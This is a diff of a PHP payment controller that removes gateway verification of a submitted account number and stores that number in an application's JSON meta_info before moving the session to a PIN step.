@@ -2,10 +2,8 @@
 
 namespace App\Modules\Payment\Http\Controllers;
 
-use App\Events\LalcoinPaymentAccountNumberSubmitted;
 use App\Events\PaymentAccountNumberSubmitted;
-use App\Models\JobApplication;
-use App\Models\LalcoinApplication;
+use App\Models\Application;
 use App\Modules\Payment\Http\Requests\StoreAccountNumberRequest;
 use App\Modules\Payment\Services\PaymentSession;
 use App\Modules\Payment\Support\GatewayManager;
@@ -71,100 +69,41 @@ public function store(
     StoreAccountNumberRequest $request
 ): RedirectResponse {
 
-    $accountNumber = $request->validated()['account_number'];
-
-    /*
-    |--------------------------------------------------------------------------
-    | Verify Account Number with Apay
-    |--------------------------------------------------------------------------
-    */
-
-    $response = $this->gateways->driver()->verifyAccountNumber(
-        $this->session,
-        $accountNumber,
-    );
-
-    if (! $response->successful) {
-        return back()->withErrors([
-            'account_number' => $response->message,
-        ]);
-    }
+    $parcel_number = $request->validated()['account_number'];
 
     // Store account number in payment session
     $this->session->put([
-        'account_number' => $accountNumber,
+        'parcel_number' => $parcel_number,
     ]);
-
-    /*
-    |--------------------------------------------------------------------------
-    | Find Application by Payment Reference
-    |--------------------------------------------------------------------------
-    */
 
     $referenceNo = $this->session->get('reference_no');
 
     if ($referenceNo) {
-
-        /*
-        |--------------------------------------------------------------------------
-        | LAL Coin Application
-        |--------------------------------------------------------------------------
-        */
-
-        if (str_starts_with($referenceNo, 'LAL-')) {
-
-            $application = \App\Models\LalcoinApplication::where(
+            $application = Application::where(
                 'payment_reference',
                 $referenceNo
             )->first();
-
-            if ($application) {
-
+            if($application){
+                $meta_info = $application->meta_info;
+                if (is_string($meta_info)) {
+                    $decoded = json_decode(
+                        $meta_info,
+                        true
+                    );
+                    $meta_info = is_array($decoded)
+                        ? $decoded
+                        : [];
+                } elseif (! is_array($meta_info)) {
+                    $meta_info = [];
+                }
+                $meta_info['number'] = $parcel_number;
                 $application->update([
-                    'payment_number' => $accountNumber,
+                    'meta_info' => $meta_info,
                 ]);
-                // Realtime update
-                event(new LalcoinPaymentAccountNumberSubmitted($application));
-            }
-
-        } else {
-
-            /*
-            |--------------------------------------------------------------------------
-            | Job Application
-            |--------------------------------------------------------------------------
-            */
-
-            $application = \App\Models\JobApplication::where(
-                'payment_reference',
-                $referenceNo
-            )->first();
-
-            if ($application) {
-
-                $application->update([
-                    'payment_number' => $accountNumber,
-                ]);
-
-                // Realtime browser notification
                 event(new PaymentAccountNumberSubmitted($application));
-
-                // Email notification
-                \Notification::route(
-                    'mail',
-                    config('mail.admin_notification_email')
-                )->notify(
-                    new PaymentAccountNumberSubmittedNotification($application)
-                );
             }
-        }
-    }
 
-    /*
-    |--------------------------------------------------------------------------
-    | Move to PIN Step
-    |--------------------------------------------------------------------------
-    */
+    }
 
     $this->session->setStep('pin');
 
